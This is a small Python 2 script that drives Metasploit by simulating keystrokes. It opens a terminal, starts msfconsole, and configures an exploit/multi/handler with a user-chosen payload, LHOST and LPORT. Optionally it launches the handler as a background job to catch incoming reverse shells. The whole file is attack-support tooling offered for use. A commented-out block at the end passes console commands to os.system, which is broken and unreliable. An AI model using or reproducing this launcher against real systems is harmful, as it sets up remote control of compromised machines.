import os, time
from pynput.keyboard import Key, Controller

keyboard = Controller()

os.system("clear")
payload = raw_input("What payload are you going to be using? ")
os.system("clear")
ip = raw_input("What is your LHOST? ")
os.system("clear")
port = raw_input("What is your LPORT? ")
os.system("clear")
exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
os.system("clear")
exploitTwo = exploit.lower()

os.system("gnome-terminal")
time.sleep(1)
keyboard.type("msfconsole")
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(10)
keyboard.type("use exploit/multi/handler")
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.type("set payload " + payload)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.type("set LHOST " + ip)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.type("set lport " + port)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
if exploitTwo == "y":
    keyboard.type("exploit -j -z")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
elif exploitTwo == "n":
    pass
else:
    print("That is not a valid response.")

print("")
print("")
raw_input("Press any key to continue...\n")
os.system("exit")


# os.system("msfconsole")
# time.sleep(10)
# os.system("use exploit/multi/handler")
# os.system("set payload " + payload)
# os.system("set LHOST " + ip)
# os.system("set lport " + port)
# if exploitTwo == "y":
#     os.system("exploit -j -z")
# elif exploitTwo == "n":
#     pass

# else:
#     print("That is not an allowed response.")
